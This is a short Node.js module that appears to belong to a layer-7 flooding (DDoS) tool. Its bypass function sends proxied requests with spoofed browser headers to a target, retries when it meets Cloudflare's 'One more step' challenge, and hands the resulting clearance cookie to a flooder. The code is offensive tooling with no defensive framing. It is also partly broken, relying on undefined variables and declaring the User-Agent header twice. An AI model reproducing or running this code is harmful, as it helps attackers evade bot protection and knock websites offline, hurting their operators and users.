var randomstring = require("randomstring");
module.exports = function Browser() {
    const request = require('request'),
    requestJar = request.jar(),
        multi_bypasser = require('./multi_bypasser/').defaults({
        jar: requestJar
    });

    function bypass(proxy, uagent, callback, force) {
        var cookie = "";
            multi_bypasser.get({
                uri: l7.target,
                proxy: proxy,
                headers: {
                     "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
                     "Accept-Encoding": "gzip, deflate, br",
                     "Accept-Language": "tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7",
                     "Cache-Control": "no-cache",
                     "Pragma": "no-cache",
                     "Sec-Fetch-Dest": "document",
                     "Sec-Fetch-Mode": "navigate",
                     "Sec-Fetch-User": "?1",
                     "Upgrade-Insecure-Requests": "1",
                     "Connection": "Keep-Alive",
                     'User-Agent': flooder.randomUA,
                     "Referer": refererString,
                     "User-Agent": uaString

    }
    
            }, (err, res, body) => {
                if (err || !res || !body || !res.headers['set-cookie']) {
                    if (res && body && /One more step/.test(body) && res.headers.server == 'cloudflare' && res.statusCode !== 200) {
                        return bypass(proxy, uagent, callback, true);
                    }
                    return true;
                }
                cookie = res.headers['set-cookie'].shift().split(';').shift();
                callback(cookie);
            });

        }


function RandomInteger(min, max) {  
  return Math.floor(
    Math.random() * (max - min) + min
  )
}
        function RandomString(length) {
  var result           = '';
  var characters       = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
  var charactersLength = characters.length;
  for ( var i = 0; i < length; i++ ) {
     result += characters.charAt(Math.floor(Math.random() * charactersLength));
  }
  return result;
}        
    return bypass;
}